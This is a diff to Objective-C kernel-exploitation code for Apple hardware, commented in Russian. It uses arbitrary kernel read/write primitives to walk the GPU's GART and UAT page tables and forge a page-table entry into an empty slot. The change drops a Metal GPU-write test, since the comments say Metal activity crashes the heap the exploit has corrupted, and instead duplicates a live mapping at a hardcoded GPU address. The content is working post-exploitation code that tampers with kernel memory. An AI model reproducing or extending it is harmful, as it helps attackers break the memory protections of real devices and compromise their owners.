@@ -5370,44 +5370,10 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
     //    Сверка vtable: slid 0xfffffff007b62560 (AGXGartG16).
     uint64_t gart = kp_untag_ptr(kp_rc_kread64(accel + 0xd0));
     GNOTE( [NSString stringWithFormat:@"  accel+0xd0 → gart @ %#llx", gart]);
-    // таблицы создаются лениво при первой GPU-работе — делаем Metal-буфер
-    // и РЕАЛЬНУЮ compute-запись (иначе PTE не материализуются)
-    @autoreleasepool {
-        id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
-        GNOTE( [NSString stringWithFormat:@"  MTLDevice: %@", mtl ? @"ok" : @"FAIL"]);
-        if (mtl) {
-            id<MTLBuffer> buf = [mtl newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
-            if (buf) {
-                memset(buf.contents, 0x42, 0x10000);
-                gBufContents = buf.contents;
-                gBufGPUVA = buf.gpuAddress;
-                gGartBuf = buf;
-                GNOTE( [NSString stringWithFormat:@"  Metal buf contents=%p gpuAddress=%#llx",
-                           buf.contents, (unsigned long long)buf.gpuAddress]);
-                // compute-запись 0x1337 в contents[0] — форсит PTE + доказывает DMA
-                NSError *err = nil;
-                id<MTLLibrary> lib = [mtl newLibraryWithSource:
-                    @"kernel void touchIt(device uint *b [[buffer(0)]]) { b[0] = 0x1337; }"
-                    options:nil error:&err];
-                id<MTLFunction> fn = lib ? [lib newFunctionWithName:@"touchIt"] : nil;
-                id<MTLComputePipelineState> pipe = fn ? [mtl newComputePipelineStateWithFunction:fn error:&err] : nil;
-                id<MTLCommandQueue> q = pipe ? [mtl newCommandQueue] : nil;
-                id<MTLCommandBuffer> cb = q ? [q commandBuffer] : nil;
-                id<MTLComputeCommandEncoder> enc = cb ? [cb computeCommandEncoder] : nil;
-                if (enc) {
-                    [enc setComputePipelineState:pipe];
-                    [enc setBuffer:buf offset:0 atIndex:0];
-                    [enc dispatchThreads:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
-                    [enc endEncoding];
-                    [cb commit];
-                    [cb waitUntilCompleted];
-                    uint32_t rb = *(volatile uint32_t *)buf.contents;
-                    GNOTE( [NSString stringWithFormat:@"  GPU write test: contents[0]=%#x (%@)", rb,
-                               rb == 0x1337 ? @"GPU DMA РАБОТАЕТ" : @"не дошло"]);
-                } else GNOTE( [NSString stringWithFormat:@"  compute chain оборвалась: %@", err]);
-            } else GNOTE( @"  Metal buf: FAIL");
-        }
-    }
+    // таблицы уже существуют в системе (GPU активен у ОС) — Metal НЕ нужен,
+    // его churn детонирует heap, искалеченный эксплойтом (3 ресета доказали).
+    // Идём по VA известной ЖИВОЙ записи: 0x10000000000 (pc=16, pd=0, pt=0).
+    gBufGPUVA = 0x10000000000ULL;
     if (kpLooksLikeKernelPointer(gart)) {
         uint64_t gvt = kp_untag_ptr(kp_rc_kread64(gart));
         uint64_t kbase = kconstant(base);
@@ -5492,8 +5458,8 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
             kpUatWalkScan(r, gMapper, gpuVA, pa0, "global");
 
             // 8. PTE forge probe (benign): тип фрейма L3 + запись в пустой слот
-            //    (phys = НАШ собственный буфер) + readback + restore.
-            if (L3kv && pa0) {
+            //    ЗНАЧЕНИЕМ ЖИВОЙ ЗАПИСИ [0] (страница уже GPU-мапнута) + readback.
+            if (L3kv) {
                 uint64_t tableVA = [self frameTableVAWithLog:r];
                 int ft = kpVAType(L3kv, tableVA);
                 GNOTE( [NSString stringWithFormat:@"  frame type L3 страницы = 0x%x (0x21=heap RW — пишется)", ft]);
@@ -5501,8 +5467,8 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
                 for (int j = 200; j < 2048; j++) if (kp_rc_kread64(L3kv + (uint64_t)j * 8) == 0) { emptySlot = j; break; }
                 GNOTE( [NSString stringWithFormat:@"  пустой слот: %d", emptySlot]);
                 if (emptySlot >= 0) {
-                    uint64_t live = kp_rc_kread64(L3kv); // живой эталон attrs
-                    uint64_t forge = (pa0 & 0xFFFFFFFFF000ULL) | (live & ~0xFFFFFFFFF000ULL);
+                    uint64_t live = kp_rc_kread64(L3kv); // живой эталон (valid PTE)
+                    uint64_t forge = live; // дублируем существующий маппинг — безопасно
                     uint64_t slotVA = L3kv + (uint64_t)emptySlot * 8;
                     extern void kp_rc_kwrite64(uint64_t, uint64_t);
                     kp_rc_kwrite64(slotVA, forge);
